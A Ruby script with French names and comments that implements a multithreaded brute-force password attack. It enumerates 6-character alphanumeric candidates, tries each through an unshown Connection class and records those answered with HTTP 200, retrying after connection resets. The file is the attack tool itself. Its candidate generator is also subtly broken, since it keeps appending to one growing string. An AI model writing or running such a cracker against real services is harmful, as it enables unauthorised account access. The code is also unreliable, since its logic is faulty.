# Besoin de la gemme concurrent-ruby
require 'concurrent'
require_relative 'connection'
require 'fiber'

def attaque(semaphore, mot, valides)
  count = 0
  begin
    connection = Connection.new
    semaphore.synchronize do
      return if mot.nil?

      mot.strip!
    end
    statuscode = connection.connecter(mot)
    return if statuscode != 200

    semaphore.synchronize do
      valides.push(mot)
    end
  rescue Errno::ECONNRESET => e
    semaphore.synchronize do
      # puts 'Le serveur a raccroché: '
      puts e
    end

    sleep 10
    count += 1
    retry unless count > 10
  end
end

def remplir(sized_queue, _semaphore)
  fibre = generate_enum
  passwd = ''
  while fibre.alive?
    passwd << fibre.resume.to_s
    break unless passwd

    # semaphore.synchronize do
    sized_queue << passwd
    # end
  end
end

def generate_enum
  Fiber.new do
    chaine = %w[a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9]
    chaine.repeated_permutation(6).each do |mot|
      Fiber.yield mot
    end
  end
end
# Classe BruteForce
class BruteForce
  NOMBRE_THREAD_PAR_COEUR = 25

  nombre_coeurs = Concurrent.physical_processor_count * NOMBRE_THREAD_PAR_COEUR
  semaphore = Mutex.new
  valides = []
  threads = Array[Thread]

  sized_queue = SizedQueue.new 1000
  Thread.new { remplir sized_queue, semaphore }
  tour = 1
  loop do
    nombre_coeurs.times do |index|
      threads[index] = Thread.new { attaque semaphore, sized_queue.pop, valides }
    end
    nombre_coeurs.times do |index|
      threads[index].join
    end
    GC.start
    system 'clear'
    puts tour.to_s + '00 passwd tested'
    tour += 1
  end

  puts 'Mots de passe valides: ' + valides.to_s
end
